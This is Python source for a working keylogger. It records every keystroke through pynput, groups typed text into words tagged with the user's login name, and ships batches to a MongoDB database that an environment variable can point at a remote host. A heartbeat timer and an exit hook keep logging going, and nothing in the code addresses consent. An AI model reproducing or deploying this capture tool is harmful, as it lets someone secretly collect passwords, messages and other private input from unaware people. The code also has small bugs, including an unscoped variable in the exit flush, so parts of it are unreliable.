import atexit
from pynput import keyboard
import time
import pymongo
from datetime import datetime
import threading
import queue
import os
import logging

# Set up basic logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# MongoDB Configuration
MONGO_URI = os.environ.get("MONGO_URI", "mongodb://localhost:27017/")  # Use environment variable
DATABASE_NAME = "keylogger_db"
COLLECTION_NAME = "keylogs"

# Keylog queue
keylog_queue = queue.Queue(maxsize=1000)  # Limit queue size

# Constants
BATCH_SIZE = 50
FLUSH_INTERVAL = 10  # Seconds
QUEUE_FULL_SLEEP = 0.1  # Sleep when queue is full
QUEUE_EMPTY_SLEEP = 1  # Sleep when queue is empty
HEARTBEAT_INTERVAL = 10 # Seconds for inactivity log

# Global variables
current_buffer = ""  # Maintain a global buffer to store current text input
last_flush_time = time.time()
collection = None  # Keep a global collection object
batch = []

# Function to connect to MongoDB
def get_mongodb_collection():
    try:
        client = pymongo.MongoClient(MONGO_URI)
        db = client[DATABASE_NAME]
        logging.info("MongoDB connection successful")
        return db[COLLECTION_NAME]
    except pymongo.errors.ConnectionFailure as e:
        logging.error(f"MongoDB connection error: {e}")
        raise

# Function to flush the current buffer to the queue
def flush_buffer_to_queue():
    global current_buffer
    if current_buffer:
        current_time = datetime.utcnow()
        log_data = {
            "timestamp": current_time,
            "userId": os.getlogin(),
            "eventType": "keypress",  # Keep the same eventType as before
            "eventData": {
                "key": current_buffer,  # Use the buffer as the 'key'
                "modifiers": [],  # No modifiers in this format
                "windowTitle": "N/A"  # Replace with actual window title if you have a method to get it
            }
        }
        try:
            keylog_queue.put(log_data, block=False)
        except queue.Full:
            logging.warning("Keylog queue is full, dropping text event")
            time.sleep(QUEUE_FULL_SLEEP)
        current_buffer = ""



# Function to periodically write keylogs to MongoDB
def write_logs_to_db():
    global batch, last_flush_time, collection
    collection = get_mongodb_collection()  # Initialize the collection
    while True:
        try:
            # Get keylog data from the queue (non-blocking)
            keylog_data = keylog_queue.get_nowait()
            batch.append(keylog_data)
            # Check if batch size or flush interval is reached
            if len(batch) >= BATCH_SIZE or (time.time() - last_flush_time) >= FLUSH_INTERVAL:
                if batch:
                    try:
                        collection.insert_many(batch)
                        logging.info(f"Inserted {len(batch)} keylogs into MongoDB")
                    except pymongo.errors.BulkWriteError as e:
                        logging.error(f"Error inserting to database: {e.details}")
                    batch = []  # Clear the batch
                    last_flush_time = time.time()

        except queue.Empty:
            logging.debug("Keylog queue is empty, waiting...")
            time.sleep(QUEUE_EMPTY_SLEEP)
        except Exception as e:
            logging.error(f"Unexpected error in database writer thread: {e}")

# Function for periodic heartbeat logging
def log_heartbeat():
    current_time = datetime.utcnow()
    keylog_data = {
        "timestamp": current_time,
        "userId": os.getlogin(),
        "eventType": "heartbeat",
        "eventData": {"message": "No key press event logged in the past 60 seconds"}
    }
    try:
        keylog_queue.put(keylog_data, block=False)
        flush_buffer_to_queue()  # Flush the buffer as well
    except queue.Full:
        logging.warning("Keylog queue is full, heartbeat event dropped")

    threading.Timer(HEARTBEAT_INTERVAL, log_heartbeat).start()

# Start the database writer thread
db_thread = threading.Thread(target=write_logs_to_db, daemon=True)
db_thread.start()

# Start the heartbeat thread
threading.Timer(HEARTBEAT_INTERVAL, log_heartbeat).start()

def on_press(key):
    global current_buffer

    try:
        if key == keyboard.Key.space:
            flush_buffer_to_queue()
        elif key == keyboard.Key.enter:
            flush_buffer_to_queue()
        elif key == keyboard.Key.backspace:
           current_buffer = current_buffer[:-1]
        elif hasattr(key, 'char'):
            current_buffer += key.char
        logging.debug(f"Current buffer: {current_buffer}")

    except AttributeError as e:
        logging.debug(f"Key {key} does not have a char: {e}")


# Register the atexit function
def flush_remaining_logs():
    global batch, last_flush_time
    flush_buffer_to_queue()
    if batch:
        if collection is None:
             try:
                 collection = get_mongodb_collection()
             except Exception as e:
                 logging.error(f"Error connecting to db: {e}")
                 return
        try:
            collection.insert_many(batch)
            logging.info(f"Flushed {len(batch)} remaining keylogs into MongoDB")
        except pymongo.errors.BulkWriteError as e:
            logging.error(f"Error inserting to database during flushing: {e.details}")
        batch = []  # Clear the batch
        last_flush_time = time.time()

atexit.register(flush_remaining_logs)

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()